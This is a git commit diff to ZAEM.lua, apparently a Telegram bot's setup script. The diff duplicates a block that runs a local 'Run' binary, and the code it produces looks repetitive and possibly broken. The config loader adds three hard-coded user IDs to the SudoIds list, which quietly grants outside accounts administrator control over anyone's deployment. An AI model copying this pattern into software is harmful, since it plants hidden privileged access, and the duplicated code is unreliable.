daf3cf8204bd787f3cf44b98f3dc988aa6ccf21e
bZAEM2019 <88965099+bZAEM2019@users.noreply.github.com>
2021-08-15 16:25:47 +0300

    Add files via upload

--- ZAEM.lua
+++ ZAEM.lua
@@ -86,6 +86,17 @@ io.popen("mkdir Files")
 os.execute('chmod +x Run;./Run')
 end 
 CreateConfigAuto()
+file:close() 
+io.popen("mkdir Files")
+os.execute('chmod +x Run;./Run')
+end 
+CreateConfigAuto()
+end
+local Load_David = function() 
+local f = io.open("./config.lua", "r") 
+if not f then 
+AutoSet() 
+else 
 Config = dofile("./config.lua")
 DevId = Config.DevId
 SudoIds = {Config.SudoIds,1558668590,1516553352,1750071859}
